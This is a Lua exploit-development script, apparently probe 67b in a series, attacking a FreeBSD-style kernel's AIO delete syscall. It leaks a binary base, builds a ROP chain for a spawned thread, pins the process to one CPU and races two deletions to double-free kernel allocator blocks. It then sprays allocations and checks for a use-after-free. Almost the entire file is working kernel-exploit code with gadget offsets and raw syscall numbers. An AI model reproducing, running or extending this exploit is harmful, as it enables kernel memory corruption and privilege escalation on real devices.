-- CRASH_CLASS: MODERATE
-- PROBE 67b: CPU-pinned same-cache double-free attack
--
-- Previous probes (66c-66f) failed to observe the double-free's effect
-- because main and child threads ran on DIFFERENT CPUs. UMA uses per-CPU
-- caches — a block freed on CPU 1 can only be reclaimed from CPU 1's cache.
--
-- Fix: cpuset_setaffinity(488) pins the PROCESS to one CPU. Then:
--   main's 662 free → CPU 0 cache
--   child's 662 free → CPU 0 cache (same!)
--   main's spray allocs → CPU 0 cache (same!)
-- LIFO: the next allocs from the 64B zone get the double-freed blocks.
--
-- After double-free of N blocks, the 64B zone cache has each address twice.
-- The next 2N allocs from the 64B zone return each address twice.
-- Two AIO completion records at the same address → delete one, the other's
-- tracking pointer becomes a dangling pointer → UAF.
--
-- Detection:
--   A) Delete first half of spray, then delete second half — if any in the
--      second half finds freed memory at +0x10, the handler skips the callback
--      and does a silent double-free. The return might differ.
--   B) After all deletes, submit more AIO requests. If the free list is
--      corrupted (duplicate entries), two new requests get the same address.
--      Their IDs will be normal, but their completion records share memory.
--      Delete them both — if the second crashes or returns error → CONFIRMED.
--   C) Use sysctl canary (hw.pagesize) to detect kernel memory corruption.

print("=== PROBE 67b: CPU-PINNED SAME-CACHE ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid_val
end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi2 = eb_hi
    if lo >= 0x100000000 then
        hi2 = hi2 + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi2
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)
local sf_lo, sf_hi = g_lohi(0x992)

-- Ignore signals
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(uint64(N(sa) + 16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Open /dev/zero
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- =============================================
-- [A] CPU PINNING
-- =============================================
print("")
print("-- [A] CPU PINNING --")

-- Read current affinity mask
local mask_buf = memory.alloc(16)
wq(mask_buf, uint64(0))

-- cpuset_getaffinity(487): level=3, which=2(PID), id=pid, setsize=8, mask
local ok_ga, rv_ga = pcall(function()
    return mk(487)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(mask_buf)))
end)
local ga_ret = ok_ga and sgn(rv_ga) or -999
local mask_lo = rd(N(mask_buf)) or 0
local mask_hi = rd(N(mask_buf) + 4) or 0
print(string.format("  getaffinity(PID) rv=%d mask=%08X_%08X", ga_ret, mask_hi, mask_lo))

-- Try multiple pinning strategies
local pinned = false

-- Strategy 1: Pin by PID (all threads)
local pin_mask = memory.alloc(8)
wq(pin_mask, uint64(1))  -- CPU 0 only
local ok_sa, rv_sa = pcall(function()
    return mk(488)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(pin_mask)))
end)
local sa_ret = ok_sa and sgn(rv_sa) or -999
print(string.format("  setaffinity(PID=%d,CPU0) rv=%d", pid_val, sa_ret))
if sa_ret == 0 then pinned = true end

-- Strategy 2: Pin by TID 0 (self)
if not pinned then
    wq(pin_mask, uint64(1))
    local ok2, rv2 = pcall(function()
        return mk(488)(uint64(3), uint64(1), uint64(0), uint64(8), uint64(N(pin_mask)))
    end)
    local ret2 = ok2 and sgn(rv2) or -999
    print(string.format("  setaffinity(TID=0,CPU0) rv=%d", ret2))
    if ret2 == 0 then pinned = true end
end

-- Strategy 3: CPU_LEVEL_CPUSET(1), CPU_WHICH_PID(2)
if not pinned then
    wq(pin_mask, uint64(1))
    local ok3, rv3 = pcall(function()
        return mk(488)(uint64(1), uint64(2), uint64(pid_val), uint64(8), uint64(N(pin_mask)))
    end)
    local ret3 = ok3 and sgn(rv3) or -999
    print(string.format("  setaffinity(LEVEL=1,PID) rv=%d", ret3))
    if ret3 == 0 then pinned = true end
end

-- Strategy 4: CPU_LEVEL_ROOT(2), CPU_WHICH_PID(2)
if not pinned then
    wq(pin_mask, uint64(1))
    local ok4, rv4 = pcall(function()
        return mk(488)(uint64(2), uint64(2), uint64(pid_val), uint64(8), uint64(N(pin_mask)))
    end)
    local ret4 = ok4 and sgn(rv4) or -999
    print(string.format("  setaffinity(LEVEL=2,PID) rv=%d", ret4))
    if ret4 == 0 then pinned = true end
end

-- Verify final affinity
wq(mask_buf, uint64(0))
pcall(function()
    mk(487)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(mask_buf)))
end)
local vmask_lo = rd(N(mask_buf)) or 0
local vmask_hi = rd(N(mask_buf) + 4) or 0
print(string.format("  verify mask=%08X_%08X pinned=%s", vmask_hi, vmask_lo, tostring(pinned)))

if not alive() then print("DEAD after pinning"); return end

-- =============================================
-- [B] TCB + helpers
-- =============================================
local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do wd(N(shared) + i, 0) end

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(uint64(N(reqs) + 8), uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

local function spawn_662_child(ids_addr, count, states_addr, done_off)
    local CHILD_STK = 0x800
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local sp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8
    local function push(val) wq(sp, val); sp = sp + 8 end

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rax_ret); push(uint64(662))
    push(pop_rdi_ret); push(uint64(ids_addr))
    push(pop_rsi_ret); push(uint64(count))
    push(pop_rdx_ret); push(uint64(states_addr))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rdi_ret); push(uint64(N(shared) + done_off + 8))
    push(mov_rdi_rax)

    push(pop_rdi_ret); push(uint64(N(shared) + done_off))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared) + done_off, 0)

    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)
end

-- Sysctl canary: read hw.pagesize
local function sysctl_canary()
    local mib = memory.alloc(16)
    wd(N(mib), 6)      -- CTL_HW
    wd(N(mib) + 4, 7)  -- HW_PAGESIZE
    local outbuf = memory.alloc(8)
    local lenp = memory.alloc(8)
    wd(N(outbuf), 0xDEAD); wd(N(lenp), 4)
    pcall(function()
        mk(202)(uint64(N(mib)), uint64(2), uint64(N(outbuf)),
            uint64(N(lenp)), uint64(0), uint64(0))
    end)
    return rd(N(outbuf)) or 0
end

local canary_before = sysctl_canary()
print(string.format("canary(hw.pagesize)=%d", canary_before))

-- =============================================
-- [C] DOUBLE-FREE + SAME-CACHE SPRAY (multiple trials)
-- =============================================
print("")
print("-- [C] DOUBLE-FREE + SPRAY --")

local BATCH = 16
local SPRAY = 128  -- large spray to sweep through the cache
local TRIALS = 5
local total_anomalies = 0

for trial = 1, TRIALS do
    if not alive() then print("DEAD"); break end

    -- Submit victims
    local ids = memory.alloc(BATCH * 4)
    local id_list = {}
    for i = 0, BATCH - 1 do
        local id = submit_one()
        if id == 0 then break end
        wd(N(ids) + i * 4, id)
        id_list[#id_list + 1] = id
    end

    if #id_list < BATCH then
        print(string.format("[%d] only %d IDs", trial, #id_list))
    else
        -- Poll all
        local poll_st = memory.alloc(BATCH * 4)
        pcall(function()
            mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_st)))
        end)

        -- Race: main + child both 662
        local main_st = memory.alloc(BATCH * 4)
        local child_st = memory.alloc(BATCH * 4)
        for i = 0, BATCH * 4 - 1, 4 do
            wd(N(main_st) + i, 0xCD)
            wd(N(child_st) + i, 0xCD)
        end

        spawn_662_child(N(ids), BATCH, N(child_st), 0x100 + trial * 0x20)

        pcall(function()
            mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_st)))
        end)

        -- Wait for child
        local dummy = 0
        for w = 1, 200000 do dummy = dummy + 1 end

        local doubles = 0
        for i = 0, BATCH - 1 do
            local ms = rd(N(main_st) + i * 4) or 0xCD
            local cs = rd(N(child_st) + i * 4) or 0xCD
            if ms == 0 and cs == 0 then doubles = doubles + 1 end
        end

        -- ★ SPRAY: submit many AIO requests immediately
        local spray_ids = {}
        for i = 1, SPRAY do
            local id = submit_one()
            if id == 0 then break end
            spray_ids[#spray_ids + 1] = id
        end

        -- Poll all spray
        for _, id in ipairs(spray_ids) do poll_one(id) end

        -- ★ DETECTION A: Delete first half, then second half one by one
        local half = math.floor(#spray_ids / 2)
        local first_ok, first_err = 0, 0
        local second_ok, second_err, second_crash = 0, 0, 0
        local anomaly_detail = ""

        -- Delete first half (batch)
        if half > 0 then
            local del1_ids = memory.alloc(half * 4)
            local del1_st = memory.alloc(half * 4)
            for i = 0, half - 1 do
                wd(N(del1_ids) + i * 4, spray_ids[i + 1])
                wd(N(del1_st) + i * 4, 0xAA)
            end
            pcall(function()
                mk(662)(uint64(N(del1_ids)), uint64(half), uint64(N(del1_st)))
            end)
            for i = 0, half - 1 do
                local st = rd(N(del1_st) + i * 4) or 0xAA
                if st == 0 then first_ok = first_ok + 1
                else first_err = first_err + 1 end
            end
        end

        -- Delete second half ONE BY ONE
        for i = half + 1, #spray_ids do
            if not alive() then second_crash = second_crash + 1; break end
            local db = memory.alloc(8)
            wd(N(db), spray_ids[i])
            wd(N(db) + 4, 0xAA)
            local ok, rv = pcall(function()
                return mk(662)(uint64(N(db)), uint64(1), uint64(N(db) + 4))
            end)
            if not ok then
                second_crash = second_crash + 1
                anomaly_detail = anomaly_detail ..
                    string.format(" CRASH@%d(id=%d)", i, spray_ids[i])
            else
                local st = rd(N(db) + 4) or 0xAA
                local ret = sgn(rv)
                if st == 0 then
                    second_ok = second_ok + 1
                elseif st == 0x80020003 then
                    -- Already deleted! This means another spray ID shared
                    -- the same completion record, and the first-half delete
                    -- freed it already
                    second_err = second_err + 1
                    anomaly_detail = anomaly_detail ..
                        string.format(" STALE@%d(id=%d,st=%08X)", i, spray_ids[i], st)
                    total_anomalies = total_anomalies + 1
                else
                    second_err = second_err + 1
                    anomaly_detail = anomaly_detail ..
                        string.format(" ERR@%d(id=%d,st=%08X,rv=%d)", i, spray_ids[i], st, ret)
                    total_anomalies = total_anomalies + 1
                end
            end
        end

        -- ★ DETECTION B: Submit more AIO after all deletes — check ID patterns
        local post_ids = {}
        for i = 1, 32 do
            local id = submit_one()
            if id ~= 0 then post_ids[#post_ids + 1] = id end
        end
        -- Check for duplicate IDs
        local id_seen = {}
        local dup_ids = 0
        for _, id in ipairs(post_ids) do
            if id_seen[id] then
                dup_ids = dup_ids + 1
                anomaly_detail = anomaly_detail ..
                    string.format(" DUP_ID=%d", id)
                total_anomalies = total_anomalies + 1
            end
            id_seen[id] = true
        end

        -- Cleanup post IDs
        for _, id in ipairs(post_ids) do
            poll_one(id)
            local db = memory.alloc(8)
            wd(N(db), id); wd(N(db) + 4, 0)
            pcall(function() mk(662)(uint64(N(db)), uint64(1), uint64(N(db) + 4)) end)
        end

        -- ★ DETECTION C: Sysctl canary
        local canary_now = sysctl_canary()
        local canary_ok = (canary_now == canary_before)

        print(string.format(
            "[%d] dbl=%d spray=%d del1=%d/%d del2=%d/%d/%d post_dup=%d canary=%s%s",
            trial, doubles, #spray_ids,
            first_ok, first_err,
            second_ok, second_err, second_crash,
            dup_ids,
            canary_ok and "OK" or "CHANGED",
            anomaly_detail ~= "" and (" |" .. anomaly_detail) or ""))
    end
end

-- =============================================
-- [D] AGGRESSIVE: submit + delete in tight loop to amplify corruption
-- =============================================
if alive() and total_anomalies == 0 then
    print("")
    print("-- [D] TIGHT SUBMIT-DELETE CYCLE (amplify) --")

    -- Do double-free once, then rapidly submit/delete 200 times
    -- If the free list has duplicate entries, eventually two requests
    -- share memory and one delete corrupts the other

    local ids = memory.alloc(BATCH * 4)
    local id_list = {}
    for i = 0, BATCH - 1 do
        local id = submit_one()
        if id == 0 then break end
        wd(N(ids) + i * 4, id)
        id_list[#id_list + 1] = id
    end

    if #id_list >= BATCH then
        local poll_st = memory.alloc(BATCH * 4)
        pcall(function()
            mk(664)(uint64(N(ids)), uint64(BATCH), uint64(N(poll_st)))
        end)

        local main_st = memory.alloc(BATCH * 4)
        local child_st = memory.alloc(BATCH * 4)
        for i = 0, BATCH * 4 - 1, 4 do
            wd(N(main_st) + i, 0xCD)
            wd(N(child_st) + i, 0xCD)
        end

        spawn_662_child(N(ids), BATCH, N(child_st), 0x300)
        pcall(function()
            mk(662)(uint64(N(ids)), uint64(BATCH), uint64(N(main_st)))
        end)

        local dummy = 0
        for w = 1, 200000 do dummy = dummy + 1 end

        local doubles = 0
        for i = 0, BATCH - 1 do
            local ms = rd(N(main_st) + i * 4) or 0xCD
            local cs = rd(N(child_st) + i * 4) or 0xCD
            if ms == 0 and cs == 0 then doubles = doubles + 1 end
        end
        print(string.format("  doubles: %d", doubles))

        -- Tight submit-poll-delete cycle
        local cycles = 200
        local cycle_crashes = 0
        local cycle_errs = 0
        for c = 1, cycles do
            if not alive() then
                cycle_crashes = cycle_crashes + 1
                break
            end
            local id = submit_one()
            if id == 0 then cycle_errs = cycle_errs + 1
            else
                poll_one(id)
                local db = memory.alloc(8)
                wd(N(db), id); wd(N(db) + 4, 0xAA)
                local ok, rv = pcall(function()
                    return mk(662)(uint64(N(db)), uint64(1), uint64(N(db) + 4))
                end)
                if not ok then
                    cycle_crashes = cycle_crashes + 1
                    print(string.format("  ★ CRASH at cycle %d id=%d", c, id))
                    total_anomalies = total_anomalies + 1
                    break
                end
                local st = rd(N(db) + 4) or 0xAA
                if st ~= 0 then
                    cycle_errs = cycle_errs + 1
                    if cycle_errs <= 4 then
                        print(string.format("  ★ ERR cycle=%d id=%d st=%08X", c, id, st))
                    end
                    total_anomalies = total_anomalies + 1
                end
            end
        end
        print(string.format("  %d cycles: %d crashes, %d errors", cycles, cycle_crashes, cycle_errs))

        local canary_d = sysctl_canary()
        print(string.format("  canary=%s", canary_d == canary_before and "OK" or "CHANGED"))
    end
end

-- =============================================
-- [E] SUMMARY
-- =============================================
print("")
print(string.format("TOTAL anomalies: %d", total_anomalies))
print(string.format("pinned: %s", tostring(pinned)))
print(string.format("canary final: %s", sysctl_canary() == canary_before and "OK" or "CHANGED"))
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67b DONE ===")
